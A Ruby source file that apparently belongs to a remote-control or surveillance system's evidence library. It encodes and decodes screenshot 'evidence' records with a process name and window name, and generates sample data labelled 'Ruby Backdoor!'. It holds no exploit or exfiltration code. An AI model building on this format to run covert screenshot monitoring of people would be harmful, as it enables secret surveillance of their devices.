require 'rcs-common/evidence/common'

module RCS

module SnapshotEvidence
  
  SNAPSHOT_VERSION = 2009031201
  
  def content
    path = File.join(File.dirname(__FILE__), 'content', 'snapshot', '00' + (rand(3) + 1).to_s + '.jpg')
    File.open(path, 'rb') {|f| f.read }
  end
  
  def generate_content
    [ content ]
  end
  
  def additional_header
    process_name = 'ruby'.to_utf16le_binary
    window_name = 'Ruby Backdoor!'.to_utf16le_binary
    header = StringIO.new
    header.write [SNAPSHOT_VERSION, process_name.size, window_name.size].pack("I*")
    header.write process_name
    header.write window_name
    
    header.string
  end
  
  def decode_additional_header(data)
    raise EvidenceDeserializeError.new("incomplete SNAPSHOT") if data.nil? or data.bytesize == 0

    binary = StringIO.new data

    version, process_name_len, window_name_len = binary.read(12).unpack("I*")
    raise EvidenceDeserializeError.new("invalid log version for SNAPSHOT") unless version == SNAPSHOT_VERSION

    @info[:process] = binary.read(process_name_len).utf16le_to_utf8
    @info[:window] = binary.read(window_name_len).utf16le_to_utf8
  end

  def decode_content
    @info[:content] = @info[:chunks].first
    @info[:size] = @info[:content].bytesize
    return [self]
  end
end

end # ::RCS